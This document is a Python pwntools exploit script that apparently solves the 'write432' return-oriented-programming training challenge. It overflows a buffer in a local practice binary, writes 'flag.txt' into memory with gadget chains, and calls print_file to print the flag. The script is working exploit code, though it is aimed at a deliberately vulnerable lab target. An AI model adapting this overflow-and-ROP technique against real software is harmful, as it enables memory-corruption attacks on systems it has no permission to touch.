from pwn import *

elf = ELF("write432")
rop = ROP(elf)

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *pwnme+0xb1
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BUFFER_SIZE = 32 + 8
READ_SIZE = 512

def main():
    path = b'flag.txt'
    memory = elf.bss(0x800)

    payload = flat \
    ({
        BUFFER_SIZE + context.bytes: \
        [
            # write file name to memory (in 2 halves)
            rop.find_gadget(['pop edi', 'pop ebp']).address, memory, path[:context.bytes], elf.symbols.usefulGadgets,
            rop.find_gadget(['pop edi', 'pop ebp']).address, memory + context.bytes, path[context.bytes:], elf.symbols.usefulGadgets,

            # call target function with file name as arg
            elf.symbols.print_file, elf.symbols.main, memory
        ]
    })

    c = connection()
    c.sendlineafter(b'> ', payload)
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
